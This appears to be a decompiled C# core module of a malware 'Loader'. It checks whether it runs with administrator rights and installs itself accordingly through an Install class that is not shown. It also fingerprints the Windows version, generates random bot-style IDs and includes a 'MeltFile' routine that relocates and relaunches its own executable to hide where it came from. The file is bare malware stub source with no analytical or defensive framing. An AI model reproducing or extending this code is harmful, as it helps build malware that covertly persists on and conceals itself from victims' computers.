using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Windows.Forms;

namespace Loader;

internal class Core
{
	public enum codeType
	{
		Short,
		Full
	}

	public Core()
	{
		string text = returnUserLevel(codeType.Short);
		if (text == "Admin")
		{
			if (!Install.isInstalledAdmin)
			{
				Install.installAdmin();
			}
		}
		else if (text != "admin" && !Install.isInstalled)
		{
			Install.install();
		}
	}

	public static string getOS()
	{
		string text = Environment.OSVersion.Version.ToString();
		if (text.StartsWith("6.1"))
		{
			return "WIN7";
		}
		if (text.StartsWith("6"))
		{
			return "VIS";
		}
		if (text.StartsWith("5.1"))
		{
			return "XP";
		}
		if (text.StartsWith("5"))
		{
			return "2000";
		}
		if (text.StartsWith("4.9"))
		{
			return "ME";
		}
		if (text.StartsWith("4.1"))
		{
			return "98";
		}
		return "UNKN";
	}

	public static string randID(int ammount)
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUV0123456789";
		string text2 = "";
		Random random = new Random();
		for (int i = 0; i < ammount; i++)
		{
			text2 += text[random.Next(text.Length)];
		}
		return text2;
	}

	public static string returnUserLevel(codeType Type)
	{
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
		if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
		{
			if (Type == codeType.Full)
			{
				return "Administrator";
			}
			return "Admin";
		}
		if (windowsPrincipal.IsInRole(WindowsBuiltInRole.User))
		{
			return "User";
		}
		if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Guest))
		{
			return "Guest";
		}
		return "Unknown";
	}

	[DllImport("Kernel32.dll")]
	private static extern int GetModuleFileNameA(int hModule, string lpFileName, int nSize);

	[DllImport("Kernel32.dll")]
	private static extern void ExitProcess(int uExitCode);

	[DllImport("Kernel32.dll")]
	public static extern int MoveFileExA(string lpExistingFileName, string lpNewFileName, int dwFlags);

	public static void MeltFile(string Path)
	{
		MoveFileExA(Left(Application.get_ExecutablePath(), GetModuleFileNameA(0, Application.get_ExecutablePath(), 256)), Path, 8);
		Process.Start(Path);
		ExitProcess(0);
	}

	public static string Left(string text, int length)
	{
		if (length < 0)
		{
			throw new ArgumentOutOfRangeException("length", length, "length must be > 0");
		}
		if (length == 0 || text.Length == 0)
		{
			return "";
		}
		if (text.Length <= length)
		{
			return text;
		}
		return text.Substring(0, length);
	}
}
